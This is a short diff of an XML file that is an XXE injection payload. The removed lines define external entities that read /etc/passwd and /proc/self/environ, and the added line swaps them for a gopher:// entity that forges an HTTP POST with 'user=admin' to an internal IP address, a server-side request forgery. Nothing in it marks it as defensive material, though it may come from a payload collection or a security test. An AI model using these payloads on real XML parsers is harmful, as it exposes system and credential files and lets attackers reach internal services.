@@ -1,7 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <!DOCTYPE bar [
-<!ENTITY xxe SYSTEM "file:///etc/passwd">
-<!-- <!ENTITY xxe SYSTEM "file:///proc/self/environ"> -->
+<!ENTITY xxe SYSTEM "gopher://192.168.48.232:8088/?POST%20/form%20HTTP/1.0%0d%0auser%3dadmin%0d%0a">
 ]>
 <book>
     <author>&xxe;</author>
